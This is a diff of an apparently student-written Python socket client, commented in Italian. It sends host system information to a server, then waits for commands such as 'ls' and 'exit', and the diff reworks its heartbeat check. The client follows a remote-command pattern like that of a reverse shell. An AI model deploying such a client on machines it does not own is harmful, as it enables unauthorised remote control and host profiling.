@@ -10,25 +10,17 @@ checkConnectionPort = 23000
 serverName = 'localhost'                        #prev: 192.168.86.32 \\ indirizzo IP a cui connettersi
 # usata solo per pairing iniziale, il S.O. assegna poi una porta
 serverPort = 6677
-connection = True
-
 
 def checkConnection():
-    global connection
     checkSocket = socket(AF_INET, SOCK_STREAM)
     checkSocket.connect((serverName, checkConnectionPort))
-    checkSocket.settimeout(5)
+    checkSocket.settimeout(3)
     while True:
-        try:
-            message = checkSocket.recv(1).decode()
-            checkSocket.send('0'.encode())
-            connection = True
-        except TimeoutError:
-            print("Connessione con il server persa!")
-            connection = False
-        except ConnectionResetError:
-            print("Connessione con il server persa!")
-            connection = False
+        message = checkSocket.recv(1).decode()
+        if message != '0':
+            raise Exception("Opps!!!")
+        checkSocket.send('0'.encode())
+        time.sleep(5)
 
 
 clientSocket = socket(AF_INET, SOCK_STREAM)
@@ -53,7 +45,8 @@ info = 'Uname:	' + ''.join(platform.uname()) + '\n Machine:	' + platform.machine
 clientSocket.send(info.encode())
 ack = clientSocket.recv(1024).decode()
 command = clientSocket.recv(2048).decode()
-while command != 'exit' and connection is True:
+while command != 'exit':
+    print(command)
     if command == 'ls':
         path = os.getcwd()
         clientSocket.send(path.encode())
